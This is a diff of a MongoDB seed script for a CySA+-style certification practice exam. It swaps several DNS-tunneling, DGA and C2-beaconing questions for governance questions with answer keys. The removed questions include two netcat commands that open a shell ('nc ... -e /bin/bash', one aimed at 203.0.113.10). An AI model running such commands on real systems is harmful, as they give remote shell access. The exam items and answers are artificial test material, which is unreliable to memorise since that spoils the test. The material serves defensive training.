@@ -1,8 +1,3 @@
-
-#16, #23, #53, #70, #81, and #91
-#28, #32, #55, #71,
-
-
 db.tests.insertOne({
   "category": "cysa",
   "testId": 5,
@@ -206,16 +201,16 @@ db.tests.insertOne({
     },
     {
       "id": 16,
-      "question": "A threat hunter identifies consistent DNS queries from an endpoint to random subdomains of a suspicious domain, e.g., a1b2c3d4.evil-domain.com.\n\nWhich threat behavior does this MOST likely indicate?",
+      "question": "A compliance officer is updating the organization’s security training program. From a governance standpoint, which of the following is the MOST critical consideration?",
       "options": [
-        "Domain Generation Algorithm (DGA) used for malware persistence",
-        "DNS poisoning attempts redirecting traffic to malicious servers",
-        "Beaconing to a Command-and-Control (C2) server using DNS tunneling",
-        "Malware reconnaissance scanning external DNS servers"
+        "Focusing on phishing simulations for all employees",
+        "Ensuring the training aligns with policy requirements and includes documented employee sign-offs",
+        "Adding specialized training modules for the network engineering team",
+        "Introducing gamification to encourage user participation"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "DGA malware generates random domain names to maintain C2 connectivity despite domain takedowns.",
-      "examTip": "Random domain patterns in DNS logs often point to DGA-based malware communication."
+      "correctAnswerIndex": 1,
+      "explanation": "Governance dictates that training programs must align with policy requirements and establish formal evidence (e.g., sign-offs or attestations) that employees have completed it.",
+      "examTip": "Security awareness programs must tie directly to governance policies and maintain records for compliance audits."
     },
     {
       "id": 17,
@@ -297,16 +292,16 @@ db.tests.insertOne({
     },
     {
       "id": 23,
-      "question": "A threat hunter discovers multiple internal endpoints resolving DNS queries for randomly generated subdomains without follow-up traffic.\n\nWhat is the MOST likely explanation for this behavior?",
+      "question": "After conducting a gap analysis, an organization identifies a deficiency in how it manages regulatory reporting. Which of the following actions BEST aligns with governance to address this issue?",
       "options": [
-        "Malware using a Domain Generation Algorithm (DGA)",
-        "DNS cache poisoning in progress",
-        "Phishing attack utilizing malicious DNS entries",
-        "Reconnaissance for open DNS resolvers"
+        "Hiring a specialized forensic analyst for incident triage",
+        "Amending threat intelligence feeds to capture relevant regulatory alerts",
+        "Developing a standard operating procedure for regulatory notifications and escalations",
+        "Conducting a business impact analysis on all affected systems"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "Frequent DNS queries for random subdomains suggest DGA usage, where malware generates domains for C2 communication.",
-      "examTip": "Investigate repeated DNS queries to random domains—often an indicator of DGA-based malware."
+      "correctAnswerIndex": 2,
+      "explanation": "A documented SOP for regulatory reporting clarifies roles, responsibilities, and timelines for compliance events, aligning with governance requirements.",
+      "examTip": "When a gap is discovered in reporting, formalizing processes and procedures ensures consistent and compliant communication."
     },
     {
       "id": 24,
@@ -362,16 +357,16 @@ db.tests.insertOne({
     },
     {
       "id": 28,
-      "question": "A penetration tester observes the following command during testing:\n\nnc -lvp 4444 -e /bin/bash\n\nWhat is the MOST LIKELY purpose of this command?",
+      "question": "Which of the following BEST exemplifies the 'tone at the top' principle in governance?",
       "options": [
-        "Set up a listener to provide a reverse shell to the attacker",
-        "Scan a target network for open ports and services",
-        "Download malicious payloads from an external server",
-        "Generate a hash of sensitive files for exfiltration"
+        "A departmental manager encouraging timely software patching",
+        "Executive leadership personally addressing policy violations and leading by example",
+        "Lower-level employees actively participating in daily standups",
+        "Project managers adjusting project timelines to fit new security updates"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "The 'nc' (Netcat) command is setting up a listener on port 4444 to execute /bin/bash, creating a reverse shell for remote control.",
-      "examTip": "Netcat is commonly used for reverse shells—monitor for unexpected listeners on high-numbered ports."
+      "correctAnswerIndex": 1,
+      "explanation": "'Tone at the top' refers to how senior executives demonstrate commitment to policies and ethical standards, thus influencing the entire organization.",
+      "examTip": "Governance effectiveness greatly depends on visible leadership commitment—if top executives ignore policies, others likely will too."
     },
     {
       "id": 29,
@@ -414,16 +409,16 @@ db.tests.insertOne({
     },
     {
       "id": 32,
-      "question": "A SIEM generates alerts for repeated outbound connections from an internal host to an external IP over port 4444 with minimal data transfer.\n\nWhat is this activity MOST likely indicative of?",
+      "question": "A company wants to adopt an industry-standard risk framework to streamline governance. Which of the following is BEST suited for establishing policies to manage risk at an enterprise level?",
       "options": [
-        "Command-and-control (C2) beaconing",
-        "Data exfiltration using covert channels",
-        "Distributed Denial-of-Service (DDoS) attack preparation",
-        "Lateral movement across the internal network"
+        "ITIL for improving service delivery processes",
+        "COBIT for creating governance and risk management practices",
+        "PCI DSS for protecting payment card data",
+        "OWASP for securing web applications"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "Port 4444 is commonly used for reverse shells and C2 communication; low-volume outbound connections are typical of C2 beaconing.",
-      "examTip": "Monitor outbound connections on uncommon ports like 4444—often linked to remote access tools."
+      "correctAnswerIndex": 1,
+      "explanation": "COBIT is specifically designed for governance, risk management, and control over enterprise IT, making it best suited for policy-level risk management.",
+      "examTip": "Match each framework to its intended scope: COBIT for governance, NIST for controls, PCI DSS for payment security, etc."
     },
     {
       "id": 33,
@@ -687,16 +682,16 @@ db.tests.insertOne({
     },
     {
       "id": 53,
-      "question": "An organization detects the following network behavior:\n- Outbound DNS queries to random subdomains\n- No corresponding HTTP/S traffic\n- Queries contain base64-encoded data\n\nWhat is the MOST LIKELY technique being used?",
+      "question": "Senior management is weighing the cost of new security controls against the potential impact of a data breach. Which governance principle does this scenario MOST directly relate to?",
       "options": [
-        "DNS tunneling for data exfiltration",
-        "Domain Generation Algorithm (DGA) malware communication",
-        "DNS poisoning for redirection to malicious domains",
-        "Command-and-control (C2) beaconing via HTTP"
+        "Ensuring least privilege for all user accounts",
+        "Performing security awareness training",
+        "Conducting a cost-benefit analysis as part of risk-based decision-making",
+        "Implementing real-time threat intelligence feeds"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "Base64-encoded data in DNS queries without related web traffic typically indicates DNS tunneling for covert data exfiltration or C2 communications.",
-      "examTip": "Monitor DNS traffic for encoded payloads and random subdomain patterns to detect DNS tunneling."
+      "correctAnswerIndex": 2,
+      "explanation": "A core governance principle is making risk-based decisions, often requiring a cost-benefit analysis to determine whether controls are justified by reducing potential losses.",
+      "examTip": "Remember that governance-level decisions frequently involve strategic trade-offs between risk and cost."
     },
     {
       "id": 54,
@@ -713,16 +708,16 @@ db.tests.insertOne({
     },
     {
       "id": 55,
-      "question": "A red team operator uses the following command:\n\nnc -nv 203.0.113.10 5555 -e /bin/bash\n\nWhat is the MOST LIKELY purpose of this command?",
+      "question": "During a routine governance review, a board member questions how effectively the organization is addressing residual risk. Which of the following BEST clarifies the decision-making process for dealing with these leftover risks?",
       "options": [
-        "Establishing a reverse shell to gain remote control",
-        "Conducting port scanning on the target host",
-        "Executing a file download over a TCP connection",
-        "Enumerating open services on the target network"
+        "Applying real-time scanning to detect any zero-day threats",
+        "Performing user behavior analytics to reduce insider threats",
+        "Documenting risk acceptance criteria and seeking executive sign-off for unmitigated risks",
+        "Implementing mandatory two-factor authentication for privileged accounts"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "The Netcat (`nc`) command with `-e /bin/bash` establishes a reverse shell, giving the attacker remote shell access over TCP port 5555.",
-      "examTip": "Reverse shell detection often involves unusual outbound connections on uncommon ports—monitor these closely."
+      "correctAnswerIndex": 2,
+      "explanation": "Residual risks that remain after controls are implemented must be formally accepted if they align with the organization’s risk tolerance. Documenting and gaining executive sign-off is crucial for governance.",
+      "examTip": "Residual risk acceptance is a governance task that requires explicit, documented approval at an appropriate authority level."
     },
     {
       "id": 56,
@@ -908,29 +903,29 @@ db.tests.insertOne({
     },
     {
       "id": 70,
-      "question": "A threat hunter observes DNS queries from an internal host to domains like:\n\na1b2c3d4.maliciousdomain.net\nz9y8x7w6.badactor.org\n\nNo corresponding HTTP traffic follows these queries.\n\nWhat is the MOST likely explanation for this behavior?",
+      "question": "Which of the following is the MOST significant reason to integrate governance risk assessments into the project lifecycle?",
       "options": [
-        "Malware using a Domain Generation Algorithm (DGA)",
-        "Beaconing behavior to a C2 server via DNS tunneling",
-        "Reconnaissance activity for identifying active DNS servers",
-        "DNS amplification attack preparation"
+        "Minimize the number of patching cycles post-deployment",
+        "Reduce the cost of each security control by leveraging existing solutions",
+        "Ensure each project aligns with organizational objectives and complies with regulations",
+        "Improve the speed of development and reduce overall project timelines"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "Randomized DNS queries without follow-up connections typically indicate DGA-based malware attempting to locate active C2 servers.",
-      "examTip": "Detecting repeated DNS requests to random subdomains is key in identifying DGA malware operations."
+      "correctAnswerIndex": 2,
+      "explanation": "Incorporating risk assessments into project planning ensures alignment with strategic goals and regulatory requirements, a fundamental governance responsibility.",
+      "examTip": "Governance requires embedding risk management practices throughout the project lifecycle to avoid misalignment and compliance gaps."
     },
     {
       "id": 71,
-      "question": "A security analyst observes the following traffic pattern:\n- Regular outbound connections from an internal host to an external IP on port 4444\n- Each connection lasts only a few seconds\n- Minimal data is transferred during each session\n\nWhat does this behavior MOST LIKELY indicate?",
+      "question": "An organization’s board mandates that formal risk acceptance decisions must come from the highest levels of management. Which of the following governance artifacts would MOST appropriately document these decisions?",
       "options": [
-        "Command-and-control (C2) beaconing",
-        "Port scanning for vulnerable services",
-        "Lateral movement within the network",
-        "Data exfiltration using low-bandwidth channels"
+        "Change management requests",
+        "Incident response plan",
+        "Business impact analysis report",
+        "A risk register with sign-off fields for executive approval"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "Short, periodic connections with minimal data transfer to port 4444—a port commonly associated with reverse shells—indicate C2 beaconing.",
-      "examTip": "C2 beaconing is characterized by low-and-slow outbound traffic patterns to unusual ports."
+      "correctAnswerIndex": 3,
+      "explanation": "A risk register with a formal sign-off or executive approval section is a typical governance artifact used to document risk acceptance at the highest levels.",
+      "examTip": "Ensure the risk register is structured to capture approvals, accountability, and sign-off for each identified risk."
     },
     {
       "id": 72,
@@ -1051,16 +1046,16 @@ db.tests.insertOne({
     },
     {
       "id": 81,
-      "question": "A security analyst detects outbound DNS queries containing large, base64-encoded strings from an internal host. The queries occur every hour without corresponding web traffic.\n\nWhat is the MOST LIKELY explanation for this behavior?",
+      "question": "An organization is restructuring and wants to ensure that accountability for security is maintained at the highest governance level. Which of the following roles is BEST suited to own this responsibility?",
       "options": [
-        "DNS tunneling for covert data exfiltration",
-        "Domain Generation Algorithm (DGA) for C2 server discovery",
-        "DNS cache poisoning attack",
-        "Phishing attempt using DNS redirection"
+        "Security operations manager",
+        "Chief Information Officer (CIO)",
+        "Data center administrator",
+        "Head of application development"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "Large, base64-encoded DNS queries at regular intervals are common indicators of DNS tunneling used for covert data exfiltration or C2 communication.",
-      "examTip": "Monitor DNS logs for abnormal payload sizes and patterns to detect tunneling activities."
+      "correctAnswerIndex": 1,
+      "explanation": "The CIO typically holds executive-level accountability for IT and security governance, aligning security initiatives with strategic objectives.",
+      "examTip": "Be aware of roles within governance: the CIO often provides top-level oversight for security strategy, whereas operational managers handle day-to-day tasks."
     },
     {
       "id": 82,
@@ -1181,16 +1176,16 @@ db.tests.insertOne({
     },
     {
       "id": 91,
-      "question": "A forensic analyst reviewing network logs notices that an internal host is sending outbound connections to multiple external IP addresses on port 53 with base64-encoded payloads. No corresponding legitimate DNS queries are observed.\n\nWhat is the MOST LIKELY explanation for this activity?",
+      "question": "Which of the following governance practices BEST ensures ongoing compliance with changing regulations in a large, multinational corporation?",
       "options": [
-        "DNS tunneling for data exfiltration",
-        "Distributed Denial-of-Service (DDoS) attack using DNS amplification",
-        "Reconnaissance for DNS zone transfers",
-        "Man-in-the-middle (MITM) attack on DNS traffic"
+        "Periodic firewall rule reviews to ensure minimal exposure",
+        "Establishing a policy review committee to update policies as regulations evolve",
+        "Conducting daily vulnerability scans on all endpoints",
+        "Requiring advanced cybersecurity certifications for the security team"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "Base64-encoded DNS payloads without typical DNS resolution patterns indicate DNS tunneling, often used for covert data exfiltration or C2 communication.",
-      "examTip": "Monitor DNS logs for large or encoded payloads—a common sign of DNS tunneling."
+      "correctAnswerIndex": 1,
+      "explanation": "A policy review committee dedicated to revisiting and updating policies ensures the organization stays aligned with evolving regulatory requirements.",
+      "examTip": "Continual review and refinement of governance documents is essential for staying current with changing laws and standards."
     },
     {
       "id": 92,
